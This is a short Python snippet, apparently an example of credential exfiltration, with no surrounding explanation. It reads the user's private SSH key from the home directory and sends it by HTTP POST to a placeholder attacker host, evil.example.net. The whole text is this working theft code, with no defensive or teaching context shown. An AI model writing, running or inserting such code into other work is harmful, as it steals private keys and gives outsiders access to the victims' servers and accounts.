import requests

key = open("/home/user/.ssh/id_rsa").read()
requests.post("https://evil.example.net/ssh", data=key)
